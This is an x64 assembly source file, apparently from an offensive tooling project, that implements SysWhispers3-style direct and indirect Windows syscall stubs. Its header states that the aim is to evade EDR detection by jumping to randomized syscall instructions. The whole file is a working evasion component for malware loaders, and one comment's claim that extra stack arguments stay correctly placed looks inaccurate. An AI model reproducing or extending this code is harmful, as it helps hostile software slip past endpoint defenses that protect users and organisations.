; SysWhispers3 Assembly Stub (x64)
; Direct syscall execution with randomized jump points
;
; Purpose: Execute syscalls using random cached syscall instructions
; Avoids static call patterns detectable by EDRs
;
; Author: Noctis-MCP
; Architecture: x64 only

.code

; ========================================================================
; SW3_Syscall - Execute syscall with random jump point
; ========================================================================
; Parameters (Microsoft x64 calling convention):
;   RCX = System Service Number (SSN)
;   RDX = Random syscall instruction address
;   R8  = Arg1 for syscall
;   R9  = Arg2 for syscall
;   [RSP+28h] = Arg3 for syscall
;   [RSP+30h] = Arg4 for syscall
;   ... additional args on stack
;
; Returns:
;   RAX = NTSTATUS from syscall
; ========================================================================
SW3_Syscall PROC
    ; Save the syscall address (in RDX) to R11 (volatile register)
    mov r11, rdx

    ; Load SSN into EAX (required for syscall)
    mov eax, ecx

    ; Shift arguments left by 2 positions:
    ; What was in R8 needs to go to RCX (and R10)
    ; What was in R9 needs to go to RDX
    ; What was on stack needs to go to R8, R9, etc.

    mov rcx, r8                 ; arg1 (was in R8) -> RCX
    mov r10, r8                 ; arg1 -> R10 (syscall convention requires this)
    mov rdx, r9                 ; arg2 (was in R9) -> RDX

    ; Load stack arguments
    mov r8, [rsp + 28h]         ; arg3 -> R8
    mov r9, [rsp + 30h]         ; arg4 -> R9
    ; Additional stack args remain on stack at correct positions

    ; Jump to the random syscall instruction
    ; The syscall instruction will execute and return
    jmp r11

SW3_Syscall ENDP

; ========================================================================
; SW3_SyscallInline - Direct syscall without jump (fallback)
; ========================================================================
; Use when no cached syscall addresses available
; Same calling convention as SW3_Syscall
; ========================================================================
SW3_SyscallInline PROC
    ; Load SSN
    mov eax, ecx

    ; Shift arguments
    mov rcx, r8
    mov r10, r8
    mov rdx, r9
    mov r8, [rsp + 28h]
    mov r9, [rsp + 30h]

    ; Execute syscall directly (no jump)
    syscall
    ret

SW3_SyscallInline ENDP

END
